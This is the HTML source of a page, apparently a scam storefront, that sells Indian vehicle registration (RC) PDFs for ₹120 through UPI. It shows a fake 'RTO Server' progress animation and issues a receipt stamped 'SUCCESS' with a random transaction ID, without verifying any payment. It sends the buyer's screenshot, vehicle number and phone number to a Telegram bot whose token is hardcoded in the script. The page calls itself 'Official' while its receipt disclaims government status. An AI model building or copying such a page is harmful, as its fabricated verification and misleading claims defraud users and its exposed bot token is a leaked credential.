<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RCPDF.IN - Official Digital RC</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
    <style>
        :root { --primary: #ff0066; --ind-blue: #003399; }
        * { margin:0; padding:0; box-sizing:border-box; font-family: 'Arial', sans-serif; }
        body { background: #000; color: #fff; overflow-x: hidden; }

        /* Header */
        .header { position: fixed; top: 0; width: 100%; background: #fff; padding: 12px 20px; display: flex; justify-content: space-between; align-items: center; z-index: 1000; }
        .menu-btn { cursor: pointer; display: flex; flex-direction: column; gap: 4px; }
        .menu-btn div { width: 25px; height: 3px; background: var(--primary); }
        .home-icon { background: var(--primary); color: #fff; border: none; padding: 6px 10px; border-radius: 5px; cursor: pointer; }

        /* Sidebar */
        .sidebar { position: fixed; top: 0; left: -280px; width: 260px; height: 100%; background: #fff; transition: 0.4s; z-index: 2000; padding: 80px 20px; color: #333; }
        .sidebar.active { left: 0; }
        .s-link { display: block; width: 100%; padding: 12px; margin-bottom: 10px; background: #f0f0f0; border-radius: 8px; text-decoration: none; color: #333; font-weight: bold; text-align: center; }

        /* Main Card */
        .card { margin: 120px auto 20px; width: 92%; max-width: 400px; background: #1a1a1c; padding: 30px 20px; border-radius: 25px; text-align: center; border: 1px solid #333; }

        /* REAL IND PLATE */
        .hsrp-plate {
            background: #fff; width: 100%; height: 65px; border: 2px solid #555; border-radius: 10px;
            display: flex; align-items: center; overflow: hidden; margin-bottom: 5px;
        }
        .ind-strip {
            background: var(--ind-blue); width: 45px; height: 100%;
            display: flex; flex-direction: column; align-items: center; justify-content: center; color: #fff;
        }
        .ind-strip img { width: 20px; margin-bottom: 2px; }
        .ind-strip span { font-size: 10px; font-weight: 900; letter-spacing: 1px; }

        #vehInput {
            flex: 1; border: none; height: 100%; font-size: 26px; font-weight: 900;
            text-align: center; color: #000; outline: none; letter-spacing: 1px; width: 100%;
        }

        .err { color: #ff4d4d; font-size: 12px; display: none; text-align: left; margin-bottom: 10px; }

        .btn { width: 100%; padding: 16px; border-radius: 12px; border: none; background: var(--primary); color: #fff; font-size: 18px; font-weight: bold; cursor: pointer; box-shadow: 0 4px 0 #b30047; }
        .btn:active { transform: translateY(2px); box-shadow: none; }

        /* CAR LOADER */
        .loader-wrap { position: fixed; inset: 0; background: #000; z-index: 5000; display: none; flex-direction: column; justify-content: center; align-items: center; }
        .road { width: 80%; height: 3px; background: #333; position: relative; border-radius: 10px; }
        .car { font-size: 40px; position: absolute; bottom: 0; left: 0; transform: scaleX(1); transition: 0.1s linear; }
        .pct { font-size: 40px; font-weight: 900; color: var(--primary); margin-top: 20px; }

        /* SUCCESS POPUP */
        .success { position: fixed; inset: 0; background: var(--primary); z-index: 6000; display: none; flex-direction: column; justify-content: center; align-items: center; text-align: center; padding: 20px; }

        .footer { margin-top: 30px; font-size: 11px; opacity: 0.5; text-align: center; }
    </style>
</head>
<body oncontextmenu="return false;">

    <div class="header">
        <div class="menu-btn" onclick="toggleM()"><div></div><div></div><div></div></div>
        <b style="color:var(--primary); font-size:20px;">RCPDF.IN</b>
        <button class="home-icon" onclick="location.reload()">🏠</button>
    </div>

    <div class="sidebar" id="side">
        <a href="#" class="s-link" onclick="alert('Digital RC Portal 2026')">About Us</a>
        <a href="https://insurancebju.blogspot.com/2025/11/blog-post_17.html?m=1" class="s-link">Insurance</a>
        <a href="#" class="s-link" onclick="alert('No refund after payment.')">Terms</a>
        <button class="s-link" style="background:#333; color:#fff;" onclick="toggleM()">Close</button>
    </div>

    <div class="card">
        <div id="p1">
            <h2 style="margin-bottom:20px;">Download RC</h2>
            <div class="hsrp-plate">
                <div class="ind-strip">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Flag_of_India.svg">
                    <span>IND</span>
                </div>
                <input type="text" id="vehInput" placeholder="BR-09-AB-1234" maxlength="13" oninput="formatV(this)">
            </div>
            <div id="vErr" class="err">⚠ Vehicle number required</div>
            <button class="btn" onclick="go2()">Continue</button>
        </div>

        <div id="p2" style="display:none;">
            <button class="btn" style="background:#000; margin-bottom:15px;" onclick="pay()">Pay ₹120 with ANY UPI</button>
            <div style="background:#fff; padding:10px; border-radius:10px; display:inline-block; margin-bottom:15px;">
                <img id="qr" src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=upi://pay?pa=8709610091@okbizaxis&pn=RCPDF&am=120&cu=INR" width="180">
            </div>
            <input type="tel" id="mob" placeholder="WhatsApp Number" maxlength="10" style="width:100%; padding:15px; border-radius:10px; border:none; margin-bottom:10px;">
            <div id="mErr" class="err">⚠ WhatsApp number required</div>
            <input type="file" id="ss" style="margin-bottom:15px; font-size:12px;">
            <div id="sErr" class="err">⚠ Payment screenshot required</div>
            <button class="btn" onclick="submit()">Verify & Download</button>
        </div>
    </div>

    <div class="footer">© Copyright Reserved 2026 Apex Solution</div>

    <div class="loader-wrap" id="load">
        <div class="road"><div class="car" id="carIcon">🚗</div></div>
        <div class="pct" id="pText">0%</div>
        <p style="color:#666;">Processing with RTO Server...</p>
    </div>

    <div class="success" id="succ">
        <h1 style="font-size:70px;">✅</h1>
        <h2>Submitted!</h2>
        <p style="margin:20px 0;">Receipt downloaded. PDF will be sent on WhatsApp.</p>
        <button class="btn" style="background:#fff; color:var(--primary); width:150px;" onclick="location.reload()">OK</button>
    </div>

    <script>
        function toggleM() { document.getElementById('side').classList.toggle('active'); }

        function formatV(i) {
            let v = i.value.toUpperCase().replace(/[^A-Z0-9]/g, '');
            let out = "";
            if (v.length > 0) out += v.substring(0, 2);
            if (v.length > 2) out += "-" + v.substring(2, 4);
            if (v.length > 4) out += "-" + v.substring(4, 6);
            if (v.length > 6) out += "-" + v.substring(6, 10);
            i.value = out;
            document.getElementById('vErr').style.display='none';
        }

        function go2() {
            if(document.getElementById('vehInput').value.length < 9) { document.getElementById('vErr').style.display='block'; return; }
            document.getElementById('p1').style.display='none';
            document.getElementById('p2').style.display='block';
        }

        function pay() { window.location.href="upi://pay?pa=8709610091@okbizaxis&pn=RCPDF&am=120&cu=INR"; }

        function submit() {
            const m = document.getElementById('mob').value;
            const s = document.getElementById('ss').files[0];
            let e = false;
            if(m.length<10){document.getElementById('mErr').style.display='block'; e=true;}
            if(!s){document.getElementById('sErr').style.display='block'; e=true;}
            if(e) return;

            document.getElementById('load').style.display='flex';
            let p = 0;
            let iv = setInterval(() => {
                p += 2;
                document.getElementById('pText').innerText = p + "%";
                document.getElementById('carIcon').style.left = (p * 0.85) + "%";
                if(p >= 100) {
                    clearInterval(iv);
                    makePDF();
                    sendT(s);
                }
            }, 60);
        }

        async function makePDF() {
            const { jsPDF } = window.jspdf;
            const doc = new jsPDF();
            const v = document.getElementById('vehInput').value;
            const m = document.getElementById('mob').value;

            // Border & Header
            doc.setDrawColor(255, 0, 102); doc.setLineWidth(1); doc.rect(5, 5, 200, 287);
            doc.setFillColor(255, 0, 102); doc.rect(5, 5, 200, 25, 'F');
            doc.setTextColor(255); doc.setFontSize(22); doc.text("RCPDF.IN - PAYMENT RECEIPT", 105, 22, null, null, "center");

            // Detail Table
            doc.setTextColor(0); doc.setFontSize(12);
            const row = (y, l, val) => {
                doc.setFillColor(245); doc.rect(15, y, 60, 12, 'F');
                doc.rect(15, y, 60, 12); doc.rect(75, y, 115, 12);
                doc.text(l, 18, y+8); doc.text(val, 78, y+8);
            }
            row(50, "Vehicle Number", v);
            row(62, "WhatsApp Number", m);
            row(74, "Payment Status", "SUCCESS (Rs. 120)");
            row(86, "Transaction ID", "RCP"+Math.floor(Math.random()*999999));
            row(98, "Date & Time", new Date().toLocaleString());

            // QR in PDF
            doc.text("Scan for Support:", 15, 130);
            doc.addImage(document.getElementById('qr').src, 'PNG', 15, 135, 40, 40);

            // Terms
            doc.setFontSize(10); doc.text("Terms & Conditions:", 15, 185);
            let ts = ["- No refund after payment submission.", "- Delivery time: 30-60 minutes on WhatsApp.", "- This is a digital information receipt.", "- Disclaimer: Not a government official document."];
            doc.text(ts, 15, 195);
            
            doc.save(`Receipt_${v}.pdf`);
        }

        function sendT(f) {
            let fd = new FormData();
            fd.append("chat_id", "5600045707");
            fd.append("photo", f);
            let msg = `🚀 NEW ORDER\n\n🚗 Veh: ${document.getElementById('vehInput').value}\n📱 Mob: ${document.getElementById('mob').value}\n📅 Date: ${new Date().toLocaleDateString()}\n⏰ Time: ${new Date().toLocaleTimeString()}`;
            fd.append("caption", msg);
            fetch("https://api.telegram.org/bot8138238341:AAFlgSY3OGo5oOfa-IbZ9DxdgrmAeVE525E/sendPhoto", {method:"POST", body:fd})
            .then(() => {
                document.getElementById('load').style.display='none';
                document.getElementById('succ').style.display='flex';
            });
        }
    </script>
</body>
</html>
